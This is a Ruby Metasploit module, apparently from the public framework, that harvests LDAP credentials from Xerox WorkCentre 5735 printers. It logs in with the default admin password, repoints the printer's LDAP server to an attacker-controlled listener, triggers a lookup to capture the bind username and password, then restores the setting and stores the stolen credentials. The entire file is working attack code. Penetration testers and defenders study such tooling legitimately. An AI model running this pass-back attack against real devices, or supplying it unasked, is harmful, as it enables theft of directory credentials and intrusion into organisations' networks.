#
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/http'
require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::TcpServer
  include Msf::Auxiliary::Report


  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Xerox workcentre 5735 LDAP credential extractor',
      'Description'    => %{
        This module extract the printers LDAP user and password from Xerox workcentre 5735.
      },
      'Author'         =>
        [
          'Deral "Percentx" Heiland',
          'Pete "Bokojan" Arzamendi'
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptBool.new('SSL', [true, "Negotiate SSL for outgoing connections", false]),
        OptString.new('PASSWORD', [true, "Password to access administrative interface. Defaults to 1111", '1111']),
        OptInt.new('RPORT', [ true, "The target port on the remote printer. Defaults to 80", 80]),
        OptInt.new('TIMEOUT', [true, 'Timeout for printer connection probe.', 20]),
        OptInt.new('TCPDELAY', [true, 'Number of seconds the tcp server will wait before termination.', 20]),
        OptString.new('NewLDAPServer', [true,'The IP address of the LDAP server you want the printer to connect back to.'])
      ], self.class)
  end


  def run()

    print_status("Attempting to extract LDAP username and password for the host at #{rhost}")

    @authCookie = get_default_page()
    return unless @authCookie

    status = login
    return unless status

    status = get_ldap_server_info
    return unless status

    status = update_ldap_server
    return unless status

    status = start_listener
    unless $data
        print_error("Failed to start listiner or the printer did not send us the creds. :(")
        status = restore_ldap_server
        return
    end

    status = restore_ldap_server
    return unless status

   ldap_binary_creds = $data.scan(/(\w+\\\w+).\s*(.+)/).flatten
   ldap_creds = "#{ldap_binary_creds[0]}:#{ldap_binary_creds[1]}"

   #Woot we got creds so lets save them.
   print_good( "The following creds were capured: #{ldap_creds}")
   loot_name     = "ldap.cp.creds"
   loot_type     = "text/plain"
   loot_filename = "ldap-creds.text"
   loot_desc     = "LDAP Pass-back Harvester"
   p = store_loot(loot_name, loot_type, datastore['RHOST'], $data , loot_filename, loot_desc)
   print_status("Credentials saved in: #{p.to_s}")

   register_creds("ldap",rhost,$ldap_port,ldap_binary_creds[0],ldap_binary_creds[1])

  end


  def get_default_page()
    default_page = "/header.php?tab=status"
    method = "GET"
    res = make_request(default_page,method, "")
    if res.blank? || res.code != 200
      print_error("Failed to connect to #{rhost}. Please check the printers IP address.")
      return false
    end
    @model_number = res.body.scan(/productName">XEROX WorkCentre (\d*)</).flatten # will use late for a switch for diffrent Xerox models.
    return res.get_cookies

  end

  def login()
    login_page = "/userpost/xerox.set"
    login_cookie = ""
    login_post_data = "_fun_function=HTTP_Authenticate_fn&NextPage=%2Fproperties%2Fauthentication%2FluidLogin.php&webUsername=admin&webPassword=#{datastore['PASSWORD']}&frmaltDomain=default"
    method = "POST"

    res = make_request(login_page,method,login_post_data)
    if res.blank? || res.code != 200
      print_error("Failed to login on #{rhost}. Please check the password for the Administrator account ")
      return false
    end
    return res.code
  end


  def get_ldap_server_info()
    ldap_info_page = "/ldap/index.php?ldapindex=default&from=ldapConfig"
    method = "GET"
    res = make_request(ldap_info_page,method,"")
    html_body = ::Nokogiri::HTML(res.body)
    ldap_server_settings_html = html_body.xpath('/html/body/form[1]/div[1]/div[2]/div[2]/div[2]/div[1]/div/div').text
    ldap_server_ip = ldap_server_settings_html.scan(/valIpv4_1_\d\[2\] = (\d+)/i).flatten
    ldap_port_settings = html_body.xpath('/html/body/form[1]/div[1]/div[2]/div[2]/div[2]/div[4]/script').text
    ldap_port_number = ldap_port_settings.scan(/valPrt_1\[2\] = (\d+)/).flatten
    $ldap_server = "#{ldap_server_ip[0]}.#{ldap_server_ip[1]}.#{ldap_server_ip[2]}.#{ldap_server_ip[3]}"
    $ldap_port = ldap_port_number[0]
    print_status("Found LDAP server: #{$ldap_server}")
    unless res.code == 200 || res.blank?
      print_error("Failed to get ldap data from #{rhost}.")
      return false
    end
    return res.code
  end

  def update_ldap_server()
    ldap_update_page = "/dummypost/xerox.set"
    ldap_update_post = "_fun_function=HTTP_Set_Config_Attrib_fn&NextPage=%2Fldap%2Findex.php%3Fldapindex%3Ddefault%26from%3DldapConfig&ldap.server%5Bdefault%5D.server=#{datastore['NewLDAPServer']}%3A#{datastore['SRVPORT']}&ldap.maxSearchResults=25&ldap.searchTime=30"
    method = "POST"
    print_status("Updating LDAP server: #{datastore['NewLDAPServer']} and port: #{datastore['SRVPORT']}")
    res = make_request(ldap_update_page,method,ldap_update_post)
    if res.blank? || res.code != 200
      print_error("Failed to update ldap server. Please check the host: #{rhost} ")
      return false
    end
    return res.code
   end

   def trigger_ldap_request()
      ldap_trigger_page = "/userpost/xerox.set"
      ldap_trigger_post = "nameSchema=givenName&emailSchema=mail&phoneSchema=telephoneNumber&postalSchema=postalAddress&mailstopSchema=l&citySchema=physicalDeliveryOfficeName&stateSchema=st&zipCodeSchema=postalcode&countrySchema=co&faxSchema=facsimileTelephoneNumber&homeSchema=homeDirectory&memberSchema=memberOf&uidSchema=uid&ldapSearchName=test&ldapServerIndex=default&_fun_function=HTTP_LDAP_Search_fn&NextPage=%2Fldap%2Fmappings.php%3Fldapindex%3Ddefault%26from%3DldapConfig"
      method = "POST"
      print_status("Triggering LDAP reqeust")
      res = make_request(ldap_trigger_page,method, ldap_trigger_post)
  end

  def start_listener
     server_timeout = datastore['TCPDELAY'].to_i
      begin
        print_status("Service running. Waiting for connection")
          Timeout.timeout(server_timeout) do
          exploit()
      end
      rescue Timeout::Error
        return
      end
  end

  def primer
      trigger_ldap_request()
  end

  def on_client_connect(client)
    on_client_data(client)
  end

  def on_client_data(client)
    $data = client.get_once
    client.stop
  end


 def restore_ldap_server()
    ldap_restore_page = "/dummypost/xerox.set"
    ldap_restore_post = "_fun_function=HTTP_Set_Config_Attrib_fn&NextPage=%2Fldap%2Findex.php%3Fldapaction%3Dadd%26ldapindex%3Ddefault%26from%3DldapConfig&ldap.server%5Bdefault%5D.server=#{$ldap_server}%3A#{$ldap_port}&ldap.maxSearchResults=25&ldap.searchTime=30&ldap.search.uid=uid&ldap.search.name=givenName&ldap.search.email=mail&ldap.search.phone=telephoneNumber&ldap.search.postal=postalAddress&ldap.search.mailstop=l&ldap.search.city=physicalDeliveryOfficeName&ldap.search.state=st&ldap.search.zipcode=postalcode&ldap.search.country=co&ldap.search.ifax=No+Mappings+Available&ldap.search.faxNum=facsimileTelephoneNumber&ldap.search.home=homeDirectory&ldap.search.membership=memberOf"
    method = "POST"
    print_status("Restoring LDAP server: #{$ldap_server}")
    res = make_request(ldap_restore_page,method, ldap_restore_post)
    if res.blank? || res.code != 200
      print_error("Failed to restore LDAP server: #{@ldap_server}. Please fix manually")
      return false
    end
    return res.code
   end

  def make_request(page,method,post_data)
    begin
      res = send_request_cgi(
      {
        'uri'       => page,
        'method'    => method,
        'cookie'    => @authCookie,
        'data'      => post_data
      }, datastore['TIMEOUT'].to_i)
      return res
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
      print_error("#{rhost}:#{rport} - Connection failed.")
      return false
    end
  end

  def register_creds (service_name, remote_host, remote_port, username, password)
    credential_data = {
       origin_type: :service,
       module_fullname: self.fullname,
       workspace_id: myworkspace.id,
       private_data: password,
       private_type: :password,
       username: username,
       }

    service_data = {
      address: remote_host,
      port: remote_port,
      service_name: service_name,
      protocol: 'tcp',
      workspace_id: myworkspace_id
      }

    credential_data.merge!(service_data)
    credential_core = create_credential(credential_data)

    login_data = {
      core: credential_core,
      status: Metasploit::Model::Login::Status::UNTRIED,
      workspace_id: myworkspace_id
    }

    login_data.merge!(service_data)
    create_credential_login(login_data)

  end
end
